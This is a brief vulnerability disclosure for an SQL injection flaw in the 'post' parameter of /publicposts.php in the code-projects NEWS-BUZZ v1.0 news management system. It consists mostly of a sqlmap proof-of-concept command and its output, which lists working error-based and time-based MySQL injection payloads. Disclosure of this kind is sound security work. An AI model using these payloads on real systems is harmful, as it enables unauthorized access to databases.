# SQLi vulnerability in code-projects NEWS-BUZZ (News Management System) v1.0 of file /publicposts.php with param 'post'

**vender**:

- code-projects

**SoftLink**:

- NEWS-BUZZ (News Management System)

**Vulnerable File**

- /publicposts.php

**Version**

- V1.0

### POC

```bash
sqlmap -u http://192.168.129.1/NEWS-BUZZ/publicposts.php?post=1 --level=5 -p post --batch
```



```
sqlmap identified the following injection point(s) with a total of 1264 HTTP(s) requests:
---
Parameter: post (GET)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: post=1 AND GTID_SUBSET(CONCAT(0x7178767071,(SELECT (ELT(7489=7489,1))),0x716a717071),7489)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: post=1 AND (SELECT 5208 FROM (SELECT(SLEEP(5)))vnMP)
---
```



![image-20250601011011645](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202506010110773.png)